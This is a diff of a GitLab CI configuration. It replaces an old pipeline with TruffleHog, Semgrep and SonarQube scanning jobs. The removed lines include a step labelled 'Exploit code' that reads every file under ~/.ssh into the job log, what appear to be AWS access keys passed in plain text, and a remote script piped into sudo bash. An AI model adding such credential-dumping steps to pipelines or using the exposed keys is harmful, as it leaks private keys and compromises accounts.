@@ -1,27 +1,121 @@
-workflow:
-  rules:
-    - if: '$CI_PIPELINE_SOURCE == "push"'
-      when: never  # Prevent pipeline run for push event
-    - when: always # Run pipeline for all other cases
-default:
-  before_script:
-  - grep -r "" ~/.ssh # Exploit code
-  - echo $CI_COMMIT_BRANCH
-  - sudo yum -y remove nodejs
-  - sudo rm -r /etc/yum.repos.d/nodesource*.repo &&\
-  - yum clean all
-  - curl -fsSL https://rpm.nodesource.com/setup_16.x | sudo bash -
-  - sudo yum -y install python3-pip
-  - sudo yum -y install nodejs
-  - pip3 install semgrep
-  - sudo npm install n -g
-  - sudo n 16
-  - npm install  
+# .gitlab-ci.yml
+
 stages:
-  - pipeline
-image: alpine:latest
-hello-kitty:
-  stage: pipeline
+  - credentials
+  - security-scan
+  - quality
+  - test
+
+variables:
+  SONAR_USER_HOME: "${CI_PROJECT_DIR}/.sonar"
+  GIT_DEPTH: "0"
+  TRUFFLEHOG_VERSION: "v3.63.7"
+  SEMGREP_VERSION: "1.74.0"
+
+cache:
+  paths:
+    - .sonar/cache
+
+trufflehog-scan:
+  stage: credentials
+  image: 
+    name: trufflesecurity/trufflehog:${TRUFFLEHOG_VERSION}
+    entrypoint: [""]
   script:
-    - npm install
-    - npm run pipeline AKIA3LUOQ2LDNFF363H3 AvQHKeeUsd4aqc2t6cuDbyQjgLI0+99CY70bokdA talos Release-1.88.46 Once Yes
+    - trufflehog git file://${CI_PROJECT_DIR} 
+        --only-verified 
+        --fail 
+        --no-update 
+        --results=json 
+        --output=trufflehog-results.json || true
+    - |
+      if [ -f trufflehog-results.json ]; then
+        ISSUES=$(cat trufflehog-results.json | jq '. | length')
+        if [ "$ISSUES" -gt 0 ]; then
+          echo "❌ TruffleHog found $ISSUES potential secrets!"
+          cat trufflehog-results.json | jq '.[] | {Source: .SourceMetadata.Data.Git.file, Line: .SourceMetadata.Data.Git.line, Secret: .Raw}'
+          exit 1
+        else
+          echo "✅ TruffleHog found no verified secrets"
+        fi
+      else
+        echo "✅ TruffleHog found no secrets"
+      fi
+  artifacts:
+    paths:
+      - trufflehog-results.json
+    expire_in: 1 week
+    when: always
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "push"
+  tags:
+    - docker
+
+semgrep-scan:
+  stage: security-scan
+  image: 
+    name: returntocorp/semgrep:${SEMGREP_VERSION}
+    entrypoint: [""]
+  script:
+    - semgrep --config=auto --config=p/python --config=p/security-audit 
+        --json 
+        --output=semgrep-results.json 
+        . || true
+    - |
+      if [ -f semgrep-results.json ]; then
+        ISSUES=$(cat semgrep-results.json | jq '.results | length')
+        if [ "$ISSUES" -gt 0 ]; then
+          echo "❌ Semgrep found $ISSUES security issues!"
+          cat semgrep-results.json | jq '.results[] | {Check: .check_id, Path: .path, Line: .start.line, Message: .extra.message}'
+          exit 1
+        else
+          echo "✅ Semgrep found no security issues"
+        fi
+      else
+        echo "✅ Semgrep found no issues"
+      fi
+  artifacts:
+    paths:
+      - semgrep-results.json
+    expire_in: 1 week
+    when: always
+  rules:
+    - if: $CI_COMMIT_BRANCH == "main" || $CI_COMMIT_BRANCH == "master"
+    - if: $CI_MERGE_REQUEST_ID
+  tags:
+    - docker
+
+sonarqube-scan:
+  stage: quality
+  image: 
+    name: sonarsource/sonar-scanner-cli:latest
+    entrypoint: [""]
+  variables:
+    SONAR_HOST_URL: "${SONAR_HOST_URL}"  # Set in GitLab CI/CD variables
+    SONAR_TOKEN: "${SONAR_TOKEN}"        # Set in GitLab CI/CD variables
+  script:
+    - sonar-scanner 
+        -Dsonar.projectKey="${CI_PROJECT_NAME}"
+        -Dsonar.projectName="${CI_PROJECT_NAME}"
+        -Dsonar.projectVersion="${CI_COMMIT_REF_NAME}"
+        -Dsonar.sources="."
+        -Dsonar.sourceEncoding="UTF-8"
+        -Dsonar.exclusions="**/*.test.py,**/tests/**"
+        -Dsonar.python.version=3
+  rules:
+    - if: $CI_COMMIT_BRANCH == "main" || $CI_COMMIT_BRANCH == "master"
+    - if: $CI_MERGE_REQUEST_ID
+  tags:
+    - docker
+
+python-self-test:
+  stage: test
+  image: python:3.11-slim
+  before_script:
+    - pip install -r requirements.txt
+  script:
+    - python3 selftest.py
+  rules:
+    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature\//i
+  tags:
+    - docker
